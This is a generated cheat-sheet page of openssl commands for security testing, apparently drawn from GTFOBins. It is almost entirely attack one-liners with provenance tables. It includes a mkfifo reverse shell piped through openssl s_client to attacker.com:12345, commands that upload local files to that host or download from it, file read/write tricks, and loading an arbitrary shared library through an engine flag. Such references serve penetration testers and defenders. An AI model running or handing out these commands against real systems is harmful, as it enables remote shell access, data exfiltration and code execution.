---
parsed_by: focuslocust
source: commands
type: generated
---
# openssl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## openssl

Tool page: [openssl](../../tools/linux/openssl.md)

### download

```text
openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
openssl enc -in /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA | openssl enc -out /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
openssl enc -in /path/to/input-file -out /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Evidence | Function example preserved from source parser. |

### library-load

```text
openssl req -engine ./lib.so
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
mkfifo /path/to/temp-socket
/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Evidence | Function example preserved from source parser. |

### upload

```text
openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Evidence | Function example preserved from source parser. |
